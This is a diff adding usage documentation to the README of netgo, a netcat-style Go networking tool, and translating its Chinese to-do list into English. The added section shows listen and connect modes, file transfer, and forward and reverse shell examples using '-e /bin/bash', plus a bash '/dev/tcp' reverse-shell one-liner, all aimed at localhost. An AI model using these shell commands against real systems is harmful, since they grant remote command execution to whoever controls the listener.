@@ -13,9 +13,51 @@ go build github.com/grt1st/netgo
 ./netgo
 ```
 
+## Function
+
+Basic mode:
+- Server mode: `./netgo -l -p 6666`
+- Client mode: `./netgo -a localhost -p 6666`
+
+You can use the modes just the way you use in `netcat`.
+
+You can use it to transform file also:
+
+```
+./netgo -l -p 6666 > 2.txt
+cat 1.txt | ./netgo -a localhost -p 6666
+```
+
+![](http://view.grt1st.cn/img/netgo0.png)
+
+Also use it to transform shell:
+
+Forward shell：
+```
+./netgo -l -p 6666
+./netgo -a localhost -p 6666 -e /bin/bash
+```
+![](http://view.grt1st.cn/img/netgo1.png)
+Reverse shell：
+```
+./netgo -l -p 6666 -e /bin/bash
+./netgo -a localhost -p 6666
+```
+![](http://view.grt1st.cn/img/netgo2.png)
+
+Another way:
+
+```
+bash -c "bash -i &>/dev/tcp/localhost/6666 0>&1"
+./netgo -l -p 6666
+```
+![](http://view.grt1st.cn/img/netgo3.png)
+
+
+
 ## To do list
 
-- 服务端限制连接数量
-- 对连接中断的感知
-- 错误提示修改
-- 新功能加入
+- err info
+- limit client number
+- add more functions
+
